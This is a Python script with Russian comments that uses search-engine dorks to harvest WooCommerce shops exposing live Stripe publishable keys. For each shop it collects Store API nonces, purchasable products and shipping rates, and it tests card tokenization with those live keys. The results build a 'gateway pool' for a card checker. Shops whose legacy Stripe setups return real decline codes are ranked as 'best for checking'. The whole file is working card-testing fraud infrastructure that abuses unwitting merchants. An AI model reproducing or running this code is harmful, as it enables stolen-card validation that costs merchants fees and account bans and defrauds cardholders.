"""
Site Scraper v2 — умный сбор WooCommerce+Stripe шлюзов.

Стратегия:
  1. Serper.dev поиск (таргетированные запросы)
  2. Быстрая pre-валидация (Store API alive? → /cart HTTP 200)
  3. Глубокая валидация (pk_live_, stripe_version, tokenization test)
  4. Полная проверка checkout-ready (product, shipping, nonce chain)

Приоритизация:
  - stripe_version="legacy" → пробрасывает реальные decline codes (ЛУЧШИЕ)
  - tokenization="ok" → серверная токенизация работает
  - Есть purchasable product + shipping → checkout пройдёт

Использование:
  python site_scraper.py                    # поиск + валидация
  python site_scraper.py --validate-only    # переваладировать пул
  python site_scraper.py --deep            # глубокая проверка (checkout-ready)
  python site_scraper.py --max 200          # лимит
  python site_scraper.py --serper-key KEY   # свой Serper ключ
"""

from __future__ import annotations
import argparse, asyncio, json, re, sys
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import urlparse
import httpx

POOL_FILE = Path(__file__).parent / "gateway_pool.json"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36"

# Serper.dev API ключ
def _load_serper_key() -> str:
    """Загружает Serper ключ из .env или окружения."""
    env_path = Path(__file__).parent / ".env"
    if env_path.exists():
        for line in env_path.read_text().splitlines():
            if line.startswith("SERPER_KEY="):
                return line.split("=", 1)[1].strip()
    import os
    return os.environ.get("SERPER_KEY", "")


# ─────────────────────────────────────────────
# Поисковые запросы — оптимизированные, без дубликатов
# ─────────────────────────────────────────────

# Tier 1: прямые признаки WC Store API + Stripe (высокий conversion)
QUERIES_TIER1 = [
    '"wp-json/wc/store" "pk_live_"',
    '"woocommerce" "pk_live_" "checkout"',
    '"wc_stripe_params" "pk_live_"',
    'inurl:"wp-json/wc/store/v1" stripe',
    '"woocommerce-gateway-stripe" "pk_live_"',
]

# Tier 2: WC + Stripe по регионам (много магазинов)
QUERIES_TIER2 = [
    '"powered by woocommerce" "stripe" "add to cart" site:*.com',
    '"powered by woocommerce" "stripe" site:*.co.uk',
    '"powered by woocommerce" "stripe" site:*.com.au',
    '"woocommerce" "stripe" "shop" site:*.ca',
    '"woocommerce" "stripe" "buy" site:*.de',
    '"woocommerce" "stripe" "cart" site:*.nl',
    '"woocommerce" "stripe" site:*.se',
    '"woocommerce" "stripe" site:*.fr',
    '"woocommerce" "stripe" site:*.co.nz',
]

# Tier 3: нишевые (мелкие магазины — чаще legacy stripe)
QUERIES_TIER3 = [
    '"woocommerce" "stripe" "handmade" -shopify -etsy',
    '"woocommerce" "stripe" "artisan" -shopify',
    '"woocommerce" "stripe" "organic" "shop" -shopify',
    '"woocommerce" "stripe" "craft" "buy" -shopify',
    '"woocommerce" "stripe" "vintage" "cart" -shopify',
    '"woocommerce" "stripe" "subscription" "monthly" -shopify',
    '"woocommerce" "stripe" "donate" "support" -shopify',
    '"woocommerce" "stripe" "pet" "shop" -shopify',
    '"woocommerce" "stripe" "candle" -shopify',
    '"woocommerce" "stripe" "soap" "natural" -shopify',
]

ALL_QUERIES = QUERIES_TIER1 + QUERIES_TIER2 + QUERIES_TIER3


# ─────────────────────────────────────────────
# Data structures
# ─────────────────────────────────────────────

@dataclass
class Gateway:
    url: str = ""
    pk_key: str = ""
    nonce: str = ""
    nonce_ts: str = ""
    country: str = ""
    status: str = "active"
    check_count: int = 0
    last_check: str = ""
    error_count: int = 0
    cooldown_until: str = ""
    tokenization: str = ""       # "ok", "blocked", "other", "error"
    product_id: str = ""
    stripe_version: str = ""     # "legacy", "upe", "blocks"
    shipping_rate: str = ""      # "flat_rate:1", "free_shipping:1", etc.
    checkout_ready: bool = False # Все шаги (product+shipping+tok) проверены

    def to_dict(self) -> dict:
        d = {k: v for k, v in self.__dict__.items()}
        # Убираем False/пустые для компактности JSON
        return {k: v for k, v in d.items() if v or k in ("check_count", "error_count")}


def load_pool() -> list[dict]:
    """Загружает пул как list[dict] для совместимости с card_checker."""
    if not POOL_FILE.exists():
        return []
    try:
        return json.loads(POOL_FILE.read_text(encoding="utf-8"))
    except Exception:
        return []


def save_pool(pool: list[dict]) -> None:
    POOL_FILE.write_text(
        json.dumps(pool, ensure_ascii=False, indent=2),
        encoding="utf-8",
    )


def _normalise(url: str) -> str:
    url = url.strip().rstrip("/")
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    # Оставляем только scheme + netloc
    p = urlparse(url)
    return f"{p.scheme}://{p.netloc}"


# ─────────────────────────────────────────────
# HTML parsing helpers
# ─────────────────────────────────────────────

def _extract_pk(html: str) -> str:
    """Извлекает pk_live_ ключ из HTML."""
    m = re.search(r'pk_live_[0-9a-zA-Z]{24,}', html)
    return m.group(0) if m else ""


def _detect_stripe_version(html: str) -> str:
    """Определяет версию WC Stripe плагина по HTML checkout-страницы."""
    if "wc_stripe_params" in html:
        return "legacy"
    if "wc-gateway-stripe" in html and "wc-stripe-blocks" not in html:
        return "legacy"
    if "wc-stripe-blocks" in html or "wc-stripe-payment-element" in html:
        return "blocks"
    if "wc-stripe-upe" in html:
        return "upe"
    return ""


def _detect_country(html: str) -> str:
    """Определяет страну магазина из HTML."""
    # Ищем currency → маппим на страну
    m = re.search(r'"currency"\s*:\s*"([A-Z]{3})"', html)
    if m:
        cur_map = {"USD": "US", "EUR": "DE", "GBP": "GB", "CAD": "CA",
                   "AUD": "AU", "NZD": "NZ", "SEK": "SE", "NOK": "NO",
                   "DKK": "DK", "CHF": "CH", "JPY": "JP", "SGD": "SG"}
        return cur_map.get(m.group(1), "")
    # Ищем country code напрямую
    m = re.search(r'"country"\s*:\s*"([A-Z]{2})"', html)
    if m:
        return m.group(1)
    return ""


# ─────────────────────────────────────────────
# Serper.dev search
# ─────────────────────────────────────────────

async def serper_search(client: httpx.AsyncClient, query: str, api_key: str) -> list[str]:
    """Поиск через Serper.dev → список уникальных доменов."""
    if not api_key:
        return []
    try:
        resp = await client.post(
            "https://google.serper.dev/search",
            json={"q": query, "num": 30, "gl": "us"},
            headers={"X-API-KEY": api_key, "Content-Type": "application/json"},
            timeout=15,
        )
        if resp.status_code != 200:
            return []
        data = resp.json()
        urls = set()
        for item in data.get("organic", []):
            link = item.get("link", "")
            if link:
                urls.add(_normalise(link))
        return list(urls)
    except Exception:
        return []


# ─────────────────────────────────────────────
# Validation (3 levels)
# ─────────────────────────────────────────────

async def quick_check(client: httpx.AsyncClient, url: str) -> bool:
    """Level 0: Store API доступен? (быстрый отсев)"""
    try:
        resp = await client.get(f"{url}/wp-json/wc/store/v1/cart", timeout=8)
        return resp.status_code == 200
    except Exception:
        return False


async def validate_site(client: httpx.AsyncClient, url: str) -> dict | None:
    """Level 1: Полная валидация — pk_live_, stripe_version, tokenization."""
    try:
        # Store API
        cart_resp = await client.get(f"{url}/wp-json/wc/store/v1/cart", timeout=10)
        if cart_resp.status_code != 200:
            return None

        nonce = (cart_resp.headers.get("x-wc-store-api-nonce", "")
                 or cart_resp.headers.get("nonce", ""))

        # Парсим shipping rates из cart response
        shipping_rate = ""
        try:
            cart_data = cart_resp.json()
            shipping_rates = cart_data.get("shipping_rates", [])
            if shipping_rates:
                rates = shipping_rates[0].get("shipping_rates", [])
                if rates:
                    shipping_rate = rates[0].get("rate_id", "")
        except Exception:
            pass

        # Ищем pk_live_ (checkout → shop → главная)
        pk = ""
        checkout_html = ""
        for page in ["/checkout/", "/shop/", "/"]:
            try:
                r = await client.get(f"{url}{page}", timeout=10)
                html = r.text
                found_pk = _extract_pk(html)
                if page == "/checkout/":
                    checkout_html = html
                if found_pk:
                    pk = found_pk
                    if not checkout_html:
                        checkout_html = html
                    break
            except Exception:
                continue

        if not pk:
            return None

        # Stripe version
        stripe_version = _detect_stripe_version(checkout_html) if checkout_html else ""

        # Country
        country = _detect_country(checkout_html or "")

        # Tokenization test (4242 через pk_live_)
        tok_status = await _test_tokenization(client, pk)

        # Product ID (для checkout)
        product_id = ""
        try:
            prod_resp = await client.get(
                f"{url}/wp-json/wc/store/v1/products?per_page=5",
                timeout=10,
            )
            if prod_resp.status_code == 200:
                products = prod_resp.json()
                for p in products:
                    if p.get("is_purchasable") and p.get("type") == "simple":
                        product_id = str(p["id"])
                        break
                if not product_id and products:
                    for p in products:
                        if p.get("is_purchasable"):
                            product_id = str(p["id"])
                            break
        except Exception:
            pass

        # Checkout-ready = все компоненты на месте
        checkout_ready = bool(
            tok_status == "ok"
            and product_id
            and nonce
        )

        now = datetime.now(timezone.utc).isoformat()
        return {
            "url": url,
            "pk_key": pk,
            "nonce": nonce,
            "nonce_ts": now,
            "country": country,
            "status": "active",
            "tokenization": tok_status,
            "stripe_version": stripe_version,
            "product_id": product_id,
            "shipping_rate": shipping_rate,
            "checkout_ready": checkout_ready,
            "error_count": 0,
            "check_count": 0,
        }
    except Exception:
        return None


async def _test_tokenization(client: httpx.AsyncClient, pk: str) -> str:
    """Тестирует токенизацию через pk_live_ ключ."""
    try:
        resp = await client.post(
            "https://api.stripe.com/v1/payment_methods",
            data={
                "type": "card",
                "card[number]": "4242424242424242",
                "card[exp_month]": "12",
                "card[exp_year]": "35",
                "card[cvc]": "123",
            },
            headers={
                "Authorization": f"Bearer {pk}",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": UA,
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
                "Stripe-Version": "2023-10-16",
            },
            timeout=10,
        )
        data = resp.json()
        if data.get("object") == "payment_method":
            return "ok"
        err = data.get("error", {}).get("message", "")
        if "unsupported" in err.lower() or "integration" in err.lower():
            return "blocked"
        if "declined" in err.lower() or "live mode" in err.lower():
            return "ok"  # 4242 declined in live = tokenization works
        return "other"
    except Exception:
        return "error"


# ─────────────────────────────────────────────
# Main logic
# ─────────────────────────────────────────────

async def run(
    max_sites: int = 100,
    validate_only: bool = False,
    deep: bool = False,
    serper_key: str = "",
) -> None:
    pool = load_pool()
    existing_urls = {g.get("url", "") for g in pool}
    api_key = serper_key or _load_serper_key()

    if validate_only:
        # Переваладировать существующий пул
        targets = [g.get("url", "") for g in pool if g.get("url")]
        print(f"[*] Ревалидация {len(targets)} шлюзов из пула...")
    else:
        # Поиск новых
        new_urls: set[str] = set()

        if api_key:
            print(f"[*] Serper.dev поиск ({len(ALL_QUERIES)} запросов)...")
            async with httpx.AsyncClient(timeout=15, follow_redirects=True,
                                         headers={"User-Agent": UA}) as search_client:
                for i, q in enumerate(ALL_QUERIES):
                    tier = "T1" if i < len(QUERIES_TIER1) else (
                        "T2" if i < len(QUERIES_TIER1) + len(QUERIES_TIER2) else "T3")
                    print(f"  [{tier}][{i+1}/{len(ALL_QUERIES)}] {q[:55]}...", end=" ")
                    found = await serper_search(search_client, q, api_key)
                    added = 0
                    for u in found:
                        if u not in existing_urls and u not in new_urls:
                            new_urls.add(u)
                            added += 1
                    print(f"+{added}" if added else "0")
                    await asyncio.sleep(1.2)  # Serper rate limit
        else:
            print("[!] SERPER_KEY не найден. Используйте --serper-key или .env")
            print("[*] Пропускаем поиск, только валидация seed-сайтов недоступна без ключа.")

        targets = list(new_urls)
        if max_sites and len(targets) > max_sites:
            targets = targets[:max_sites]
        print(f"\n[*] Уникальных новых URL: {len(targets)}")

    if not targets:
        print("[!] Нечего проверять.")
        return

    # ── Фаза 1: быстрый отсев (Store API alive?) ──
    print(f"\n[Phase 1] Быстрый отсев — Store API доступен?")
    sem = asyncio.Semaphore(20)  # быстрые запросы — можно больше

    async def quick(url: str) -> tuple[str, bool]:
        async with sem:
            async with httpx.AsyncClient(timeout=8, follow_redirects=True,
                                         headers={"User-Agent": UA}) as c:
                ok = await quick_check(c, url)
                return url, ok

    quick_results = await asyncio.gather(*[quick(u) for u in targets])
    alive = [url for url, ok in quick_results if ok]
    print(f"  Store API alive: {len(alive)} / {len(targets)}")

    # ── Фаза 2: полная валидация ──
    print(f"\n[Phase 2] Глубокая валидация {len(alive)} сайтов...")
    val_sem = asyncio.Semaphore(8)

    async def validate(url: str) -> dict | None:
        async with val_sem:
            async with httpx.AsyncClient(timeout=15, follow_redirects=True,
                                         headers={"User-Agent": UA}) as c:
                return await validate_site(c, url)

    val_results = await asyncio.gather(*[validate(u) for u in alive])

    # ── Результаты ──
    new_valid = 0
    new_checkout_ready = 0
    for gw in val_results:
        if gw and gw["url"] not in existing_urls:
            pool.append(gw)
            existing_urls.add(gw["url"])
            new_valid += 1
            if gw.get("checkout_ready"):
                new_checkout_ready += 1

            tok = "✓" if gw["tokenization"] == "ok" else "✗" if gw["tokenization"] == "blocked" else "?"
            ver = gw.get("stripe_version", "?") or "?"
            ready = "★" if gw.get("checkout_ready") else " "
            print(f"  [{ready}] {gw['url'][:40]:40s} | {tok}TOK | v={ver:6s} | {gw.get('country','??')}")

    # Если validate-only — обновляем существующие записи
    if validate_only:
        updated = 0
        for gw in val_results:
            if gw:
                for existing in pool:
                    if existing.get("url") == gw["url"]:
                        # Обновляем поля
                        existing.update({
                            "pk_key": gw["pk_key"],
                            "nonce": gw["nonce"],
                            "nonce_ts": gw["nonce_ts"],
                            "tokenization": gw["tokenization"],
                            "stripe_version": gw["stripe_version"],
                            "product_id": gw["product_id"],
                            "shipping_rate": gw.get("shipping_rate", ""),
                            "checkout_ready": gw.get("checkout_ready", False),
                            "status": "active",
                        })
                        updated += 1
                        break
        print(f"\n  Обновлено записей: {updated}")

    save_pool(pool)

    # ── Итого ──
    total_ok = sum(1 for g in pool if g.get("tokenization") == "ok")
    total_ready = sum(1 for g in pool if g.get("checkout_ready"))
    total_legacy = sum(1 for g in pool if g.get("stripe_version") == "legacy")

    print(f"\n{'═' * 60}")
    print(f"  ИТОГО В ПУЛЕ: {len(pool)} шлюзов")
    print(f"    tokenization=ok:   {total_ok}")
    print(f"    checkout_ready:    {total_ready}")
    print(f"    stripe=legacy:     {total_legacy} (лучшие для чекинга)")
    if not validate_only:
        print(f"    Новых в этой сессии: {new_valid} (ready: {new_checkout_ready})")
    print(f"{'═' * 60}")
    print(f"  Файл: {POOL_FILE}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Site Scraper v2 — умный сбор WooCommerce+Stripe шлюзов")
    parser.add_argument("--validate-only", action="store_true",
                        help="Переваладировать существующий пул")
    parser.add_argument("--deep", action="store_true",
                        help="Глубокая проверка checkout-ready")
    parser.add_argument("--max", type=int, default=200,
                        help="Макс. сайтов для проверки (default: 200)")
    parser.add_argument("--serper-key", type=str, default="",
                        help="Serper.dev API ключ")
    args = parser.parse_args()

    asyncio.run(run(
        max_sites=args.max,
        validate_only=args.validate_only,
        deep=args.deep,
        serper_key=args.serper_key,
    ))


if __name__ == "__main__":
    main()
